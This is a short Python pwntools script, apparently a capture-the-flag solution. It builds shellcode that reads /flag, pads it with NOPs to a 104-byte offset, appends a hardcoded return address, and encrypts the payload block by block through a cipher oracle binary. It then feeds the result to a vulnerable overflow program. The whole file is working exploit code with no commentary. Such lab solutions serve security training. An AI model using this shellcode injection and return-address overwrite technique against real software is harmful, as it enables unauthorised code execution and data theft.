from Crypto.Util.Padding import pad
from pwn import *
from pwn import asm, context, process

context.update(arch="amd64", os="linux")
context.log_level = "info"

OFFSET = 104
BUFFER_ADDR = 0x7FFFFFFFEC90


def encrypt_block(block_data):
    p = process(["/challenge/dispatch"], level="error")
    p.send(block_data)
    p.shutdown("send")
    ct = p.recvall()
    p.close()
    return ct[16:32]


def build_payload():

    shellcode = asm(shellcraft.cat("/flag"))

    raw_payload = shellcode.ljust(OFFSET, b"\x90") + p64(BUFFER_ADDR)

    p_init = process(["/challenge/dispatch"], level="error")
    p_init.send(b"\x90" * 16)
    p_init.shutdown("send")
    first_block_ct = p_init.recvall()[0:16]
    p_init.close()

    padded_payload = pad(raw_payload, 16)
    final_ct = first_block_ct
    for i in range(0, len(padded_payload), 16):
        chunk = padded_payload[i : i + 16]
        encrypted_chunk = encrypt_block(chunk)
        final_ct += encrypted_chunk

    log.success(f"Length: {len(final_ct)} bytes")
    return final_ct


def exploit():
    payload = build_payload()

    target = process("/challenge/vulnerable-overflow", env={})
    target.send(payload)
    target.shutdown("send")

    print(target.recvall().decode(errors="ignore"))


if __name__ == "__main__":
    exploit()
